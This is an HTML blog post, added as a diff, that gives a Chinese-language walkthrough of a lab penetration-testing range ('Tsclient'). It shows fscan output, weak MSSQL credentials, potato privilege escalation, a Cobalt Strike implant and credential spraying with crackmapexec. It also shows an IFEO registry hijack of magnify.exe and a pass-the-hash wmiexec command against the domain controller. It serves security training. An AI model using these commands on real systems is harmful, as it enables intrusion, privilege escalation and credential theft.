@@ -1,0 +1,747 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fearless123">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="flag1先扫一下 12345678910111213141516171819202122232425262728D:\天狐工具箱\gui_scan\fscan&gt;fscan.exe -h 39.99.153.41   ___                              _  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ &#x2F; &#x2F;_\&#x2F;____&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜之Tsclient">
+<meta property="og:url" content="http://fearless-123.github.io/2025/08/31/Tsclient/index.html">
+<meta property="og:site_name" content="fearless123">
+<meta property="og:description" content="flag1先扫一下 12345678910111213141516171819202122232425262728D:\天狐工具箱\gui_scan\fscan&gt;fscan.exe -h 39.99.153.41   ___                              _  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ &#x2F; &#x2F;_\&#x2F;____&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361696-21.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361677-1.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361677-2.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361677-3.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-4.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-5.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-6.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-7.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-8.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-9.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-10.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-11.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-12.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-13.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-14.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-15.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-16.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-17.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361678-18.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361679-19.png">
+<meta property="og:image" content="http://fearless-123.github.io/Tsclient/1756632361679-20.png">
+<meta property="article:published_time" content="2025-08-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-08-31T09:27:59.974Z">
+<meta property="article:author" content="fearless123">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://fearless-123.github.io/Tsclient/1756632361696-21.png">
+  
+  
+  
+  <title>春秋云镜之Tsclient - fearless123</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fearless-123.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"OfnFQ9kB1ajL2mPoqcvGYy11-gzGzoHsz","app_key":"FxzCBhWmJYqZ3yxZGPqDOHe3","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fearless123</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜之Tsclient"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-31 00:00" pubdate>
+          2025年8月31日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜之Tsclient</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><p>先扫一下</p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">D:\天狐工具箱\gui_scan\fscan&gt;fscan.exe -h <span class="hljs-number">39.99</span><span class="hljs-number">.153</span><span class="hljs-number">.41</span><br><br>   ___                              _<br>  / _ \     ___  ___ _ __ __ _  ___| | __<br> / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /</span><br><span class="hljs-string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="hljs-string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="hljs-string">                     fscan version: 2.0.0</span><br><span class="hljs-string">[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880</span><br><span class="hljs-string">[*] 开始信息扫描...</span><br><span class="hljs-string">[*] 最终有效主机数量: 1</span><br><span class="hljs-string">[*] 共解析 218 个有效端口</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:135</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:80</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:139</span><br><span class="hljs-string">[+] 端口开放 39.99.153.41:1433</span><br><span class="hljs-string">[+] 存活端口数量: 4</span><br><span class="hljs-string">[*] 开始漏洞扫描...</span><br><span class="hljs-string">[*] 网站标题 http://39.99.153.41       状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="hljs-string">[*] NetInfo</span><br><span class="hljs-string">[*] 39.99.153.41</span><br><span class="hljs-string">   [-&gt;] WIN-WEB</span><br><span class="hljs-string">   [-&gt;] 172.22.8.18</span><br><span class="hljs-string">   [-&gt;] 2001:0:348b:fb58:3cf4:1774:d89c:66d6</span><br><span class="hljs-string">[!] 扫描错误 39.99.153.41:139 - netbios error</span><br><span class="hljs-string">[+] MSSQL 39.99.153.41:1433:sa 1qaz!QAZ</span><br><span class="hljs-string">[+] 扫描已完成: 4/4</span><br><span class="hljs-string">[*] 扫描结束,耗时: 15.6297851s</span><br></code></pre></td></tr></table></figure>
+
+<p>sa 1qaz!QAZ 发现账号密码</p>
+<p>mdut直接连接</p>
+<p><img src="/../Tsclient/1756632361696-21.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>尝试上传土豆提高权限到sysytem</p>
+<p><img src="/../Tsclient/1756632361677-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>传cs马</p>
+<p><img src="/../Tsclient/1756632361677-2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>甜土豆上线system用户</p>
+<p><img src="/../Tsclient/1756632361677-3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>拿到第一个flag</p>
+<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">C:\Users\Public\FScan_2<span class="hljs-number">.0</span><span class="hljs-number">.1</span>_windows_x64.exe.exe -h <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.18</span>/<span class="hljs-number">24</span> <br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /    │</span><br><span class="hljs-string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="hljs-string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="hljs-string">└──────────────────────────────────────────────┘</span><br><span class="hljs-string">      Fscan Version: 2.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">[2.2s]     已选择服务扫描模式</span><br><span class="hljs-string">[2.2s]     开始信息扫描</span><br><span class="hljs-string">[2.2s]     CIDR范围: 172.22.8.0-172.22.8.255</span><br><span class="hljs-string">[2.2s]     generate_ip_range_full</span><br><span class="hljs-string">[2.2s]     解析CIDR 172.22.8.18/24 -&gt; IP范围 172.22.8.0-172.22.8.255</span><br><span class="hljs-string">[2.2s]     最终有效主机数量: 256</span><br><span class="hljs-string">[2.2s]     开始主机扫描</span><br><span class="hljs-string">[2.2s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.15     存活 (ICMP)</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.18     存活 (ICMP)</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.31     存活 (ICMP)</span><br><span class="hljs-string">[2.2s] [*] 目标 172.22.8.46     存活 (ICMP)                                       C:\Users\Public\fscan.exe -h 172.22.8.18/24[5.2s]     存活主机数量: 424 </span><br><span class="hljs-string">[5.2s]     有效端口数量: 233</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:445</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:389</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:139</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.31:135</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:1433</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:135</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:445</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.15:88</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.31:445</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.31:139</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:135</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:139</span><br><span class="hljs-string">[5.2s] [*] 端口开放 172.22.8.18:80                       C:\Users\Public\fscan.exe -h 172.22.8.18/24[6.2s] [*] 端口开放 172.22.8.46:445</span><br><span class="hljs-string">[6.2s] [*] 端口开放 172.22.8.46:139</span><br><span class="hljs-string">[6.2s] [*] 端口开放 172.22.8.46:135</span><br><span class="hljs-string">[6.2s] [*] 端口开放 172.22.8.46:80                 C:\Users\Public\FScan_2.0.1_windows_x64.exe.exe -h 172.22.8.18/24 [9.3s]     扫描完成, 发现 17 个开放端口</span><br><span class="hljs-string">[9.3s]     存活端口数量: 17</span><br><span class="hljs-string">[9.3s]     开始漏洞扫描</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.18</span><br><span class="hljs-string">主机名: WIN-WEB</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.18</span><br><span class="hljs-string">   IPv6地址:</span><br><span class="hljs-string">      └─ 2001:0:348b:fb58:20d1:213:d89c:7db3</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.31</span><br><span class="hljs-string">主机名: WIN19-CLIENT</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.31</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.15</span><br><span class="hljs-string">主机名: DC01</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.15</span><br><span class="hljs-string">[9.3s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.8.46</span><br><span class="hljs-string">主机名: WIN2016</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.8.46</span><br><span class="hljs-string">[9.3s] [*] 网站标题 http://172.22.8.18        状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="hljs-string">[9.3s] [+] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="hljs-string">[9.3s] [+] NetBios 172.22.8.15     DC:XIAORANG\DC01           </span><br><span class="hljs-string">[9.3s] [+] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="hljs-string">[9.4s]     POC加载完成: 总共387个，成功387个，失败0个</span><br><span class="hljs-string">[9.4s] [*] 网站标题 http://172.22.8.46        状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="hljs-string">[16.4s] [+C:\Users\Public\fscan.exe -h 172.22.8.18/24</span><br></code></pre></td></tr></table></figure>
+
+<p>内网扫一遍</p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">net user<br></code></pre></td></tr></table></figure>
+
+<p>发现有一个john用户</p>
+<p><img src="/../Tsclient/1756632361678-4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>注入让john用户上线</p>
+<p><img src="/../Tsclient/1756632361678-5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>挂载</p>
+<p><img src="/../Tsclient/1756632361678-6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#<br>proxychains4 crackmapexec smb <span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -u <span class="hljs-string">&#x27;Aldrich&#x27;</span> -p <span class="hljs-string">&#x27;Ald@rLMWuy7Z!#&#x27;</span> -d xiaorang.lab <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../Tsclient/1756632361678-7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/../Tsclient/1756632361678-8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>修改密码成功</p>
+<p><img src="/../Tsclient/1756632361678-9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>登录46成功（注意代理</p>
+<p><img src="/../Tsclient/1756632361678-10.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以修改注册表</p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">reg add <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>劫持cmd</p>
+<p><img src="/../Tsclient/1756632361678-11.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在锁定的放大镜的地方拿到system权限</p>
+<p><img src="/../Tsclient/1756632361678-12.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/../Tsclient/1756632361678-13.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>传转发入口机流量的转发上线监听器，让46机子的system上线了</p>
+<p><img src="/../Tsclient/1756632361678-14.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/../Tsclient/1756632361678-15.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>拿到flag2</p>
+<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><p>查看域的信息</p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB">shell net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../Tsclient/1756632361678-16.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>发现本机是域管理员</p>
+<p>点击抓取本机明文密码，然后查看hash值</p>
+<p><img src="/../Tsclient/1756632361678-17.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs MATLAB"><span class="hljs-number">83</span>d29a49096bf96d0ca1e1e5531fb65b<br>proxychains4 python wmiexec.py -hashes :<span class="hljs-number">83</span>d29a49096bf96d0ca1e1e5531fb65b xiaorang.lab/WIN2016\$@<span class="hljs-number">172.22</span><span class="hljs-number">.8</span><span class="hljs-number">.15</span> -codec gbk<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../Tsclient/1756632361678-18.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>拿到shell之后读文件</p>
+<p><img src="/../Tsclient/1756632361679-19.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/../Tsclient/1756632361679-20.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>整理一下思路:首先是入口机（18号机）存在一个mssql的弱口令登录，直接用mdut工具登录后拿到一个低权限的shell，然后用甜土豆提权到system。然后传cs马，利用甜土豆触发cs马，让system上线cs，得到一个稳定持久的权限，方便进行后续的渗透。</p>
+<p>然后是net use发现了一个john用户，通过进程注入，使其上线cs，发现存在一个挂载的文件夹，里面发现了一对域的账密，通过crackmapexec的密码喷洒去连接内网的机子，利用smbpassword修改密码,登录上46号机，发现权限不够，同时为了维护权限，利用18号机子的可以监听到46号机子的特性，传了一个流量转发上线的cs马，然后打了一个镜像劫持，修改注册表，让放大镜变成cmd，在锁定在状态下获得了system权限，同时46号机子的system上线cs。</p>
+<p>46号机子是域管理员，利用它的哈希可以拿到DC，15号机子的shell，最后读flag就好了</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云镜之Tsclient</div>
+      <div>http://fearless-123.github.io/2025/08/31/Tsclient/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>fearless123</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/20/hospital/" title="春秋云镜之hospital">
+                        <span class="hidden-mobile">春秋云镜之hospital</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
